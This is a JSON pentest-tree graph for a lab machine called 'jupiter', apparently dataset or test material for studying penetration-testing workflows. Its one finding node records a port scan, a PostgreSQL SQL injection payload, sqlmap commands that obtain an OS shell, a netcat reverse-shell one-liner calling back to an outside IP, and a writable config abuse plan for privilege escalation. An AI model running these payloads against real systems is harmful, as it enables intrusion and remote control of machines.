@@ -1,0 +1,198 @@
+{
+  "machine": "jupiter",
+  "row_index": 7,
+  "legend": {
+    "node_types": {
+      "State (Blue)": "Pentest phase / sub-phase, or informational item (target IP, hostname, machine name, OS, ...)",
+      "Action (Orange)": "A concrete action the pentester performed",
+      "Finding (Green)": "The result/finding produced by an Action"
+    },
+    "status_shading": {
+      "dark": "completed",
+      "mid": "in_progress",
+      "light": "to_do"
+    },
+    "edge_types": {
+      "StateTransition (Black)": "State -> State, advancing through the PTT",
+      "SearchUpdate (Green)": "State -> Action, starting work on a PTT item",
+      "TrackUpdate (Blue)": "Action -> Finding, item execution produced findings",
+      "Prediction (Purple)": "Finding -> State, findings lead back into state"
+    }
+  },
+  "nodes": [
+    {
+      "id": "state:jupiter:r7:START",
+      "label": "State: Start",
+      "type": "State",
+      "color": "#3A86FF",
+      "status": "in_progress",
+      "title": "Start of pentest tree snapshot for 'jupiter' (row 7).",
+      "size": 30,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jupiter:r7:1",
+      "label": "State 1\nReconnaissance",
+      "type": "State",
+      "color": "#AFC8FF",
+      "status": "to_do",
+      "title": "1 Reconnaissance [to_do]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jupiter:r7:1.1",
+      "label": "State 1.1\nPassive Information Gathering",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.1 Passive Information Gathering [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:jupiter:r7:1.2",
+      "label": "State 1.2\nActive Information Gathering",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1.2 Active Information Gathering [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:jupiter:r7:1.3",
+      "label": "Action 1.3\nIdentify Open Ports, Services…",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "1.3 Identify Open Ports, Services running on the open ports and their versions [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:jupiter:r7:1.3",
+      "label": "Finding 1.3\n1.3.1 Perform a port scan - {…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "1.3.1 Perform a port scan - {Findings: Host is up (0.13s latency). Open Ports: 22/tcp: Open, Service: SSH, Version: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1; 80/tcp: Open, Service: HTTP, Version: nginx 1.18.0 (Ubuntu), HTTP Title: Did not follow redirect to http://jupiter.htb/, HTTP Server Header: nginx/1.18.0 (Ubuntu); Filtered Ports: 1477/tcp: Filtered, Service: capioverlan. Operating System: Linux, CPE: cpe:/o:linux:linux_kernel.}\n       1.3.2 Determine the services and versions on each open port - {Findings: 22/tcp: Open, Service: SSH, Version: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1; 80/tcp: Open, Service: HTTP, Version: nginx 1.18.0 (Ubuntu).}\n       1.3.3 Enumerate the HTTP service - {Findings: Discovered Subdomain: kiosk; Status Code: 200; Response Size: 34,390 bytes; Word Count: 2,150; Line Count: 212; Duration: 135 ms.}\n       1.3.4 Further Enumerate the website - {Findings: Identified API Endpoint: http://kiosk.jupiter.htb/api/ds/query; Data Source: PostgreSQL database.}\n   1.4 SQL Injection Testing - {Findings: Parameter Analyzed: JSON raw$q (custom POST); Type: Stacked queries; Payload Executed: {\"queries\":[{\"refId\":\"A\",\"datasource\":{\"type\":\"postgres\",\"uid\":\"Yt5Lg-Vz\"},\"rawSql\":\"select name as \\\"Name\\\", parent as \\\"Parent Planet\\\", meaning as \\\"Name Meaning\\\" from moons where parent = 'Saturn' order by name desc;SELECT PG_SLEEP(5)--\",\"format\":\"table\",\"datasourceId\":1,\"intervalMs\":60000,\"maxDataPoints\":937}]; Time-Based Payload: Implemented PG_SLEEP(5) to test for SQL injection vulnerability.}\n   1.5 SQL Injection Exploitation - {Findings: Tool Used: SQLMap; Command Executed: -r r1 --fresh-queries --batch --dbms postgresql --time-sec=1 --current-user --current-db --hostname --is-dba --privileges --dbs --tables; Current User: grafana_viewer; Current Database (Schema): public; Current User is DBA: True; Available Databases: public; Number of Tables in 'public': 1 table; Table Name: moons; current_setting('is_superuser')}\n   1.6 SQL Injection Reverse Shell - {Findings: Tool Used: SQLMap; Command Executed: -r r1 --fresh-queries --batch --dbms postgresql --os-shell --time-sec=1; Current User Privileges: Confirmed that the current user is a Database Administrator (DBA); Shell Output: Whoami Command Result: 'postgres'; Reverse Shell Payload: Executed command to establish a reverse shell: rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|sh -i 2>&1|nc 10.10.14.46 10001 >/tmp/f &}\n   1.7 Enumeration of Users and Files - {Findings: User Accounts Identified: Additional Users: juno, jovian; Commands Executed by User `juno`: rm -rf /dev/shm/shadow.data; /bin/bash /home/juno/shadow-simulation.sh; /bin/sh -c /home/juno/shadow-simulation.sh; sh -c lscpu --online --parse=CPU,CORE,SOCKET,NODE; lscpu --online --parse=CPU,CORE,SOCKET,NODE; /usr/bin/python3 -m http.server 80; Multiple instances of /usr/bin/curl -s server; cp -a /home/juno/shadow/examples/http-server/network-simulation.yml /dev/shm/; Observations: User `juno` appears to be active, executing scripts every two minutes; Security Misconfiguration: The `network-simulation.yml` file has a misconfiguration that allows write access to any user.}\n   1.8 Explore the content of the network-simulation.yml file - {Findings: General Configuration: Simulation Duration: Stops after 10 simulated seconds (`stop_time: 10s`); System Call Latency: Enabled to prevent busy looping during non-blocking system calls (`model_unblocked_syscall_latency: true`); Network Configuration: Network Graph Type: Utilizes a built-in network graph with a single vertex and a bandwidth of 1 Gbit (`type: 1_gbit_switch`); Host Configuration: Server Host: Hostname: `server`, Network Node ID: 0, Processes: Path: `/usr/bin/python3`, Arguments: `-m http.server 80`, Start Time: 3 seconds; Client Hosts: Hostnames: `client1`, `client2`, `client3`, Network Node ID: 0, Quantity: 3, Processes: Path: `/usr/bin/curl`, Arguments: `-s server`, Start Time: 5 seconds; Observations: The configuration file is executed automatically by user `juno` on the system; Implications: Since the configuration file can be modified, there is an opportunity to alter one of the commands to potentially gain unauthorized access to user `juno`'s account.}\n   1.9 Target IP - 10.10.11.216",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    }
+  ],
+  "edges": [
+    {
+      "from": "state:jupiter:r7:START",
+      "to": "state:jupiter:r7:1",
+      "label": "1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jupiter:r7:1",
+      "to": "state:jupiter:r7:1.1",
+      "label": "1.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jupiter:r7:1.1",
+      "to": "state:jupiter:r7:1.2",
+      "label": "1.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:jupiter:r7:1.2",
+      "to": "action:jupiter:r7:1.3",
+      "label": "1.3 Identify Open Por…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:jupiter:r7:1.3",
+      "to": "finding:jupiter:r7:1.3",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:jupiter:r7:1.3",
+      "to": "state:jupiter:r7:1.2",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    }
+  ],
+  "graph_statistics": {
+    "total_nodes": 6,
+    "total_edges": 6,
+    "state_nodes": 4,
+    "action_nodes": 1,
+    "finding_nodes": 1,
+    "ptt_items_parsed": 4
+  },
+  "csv_row_index": 64,
+  "source_csv": "test_data.csv"
+}
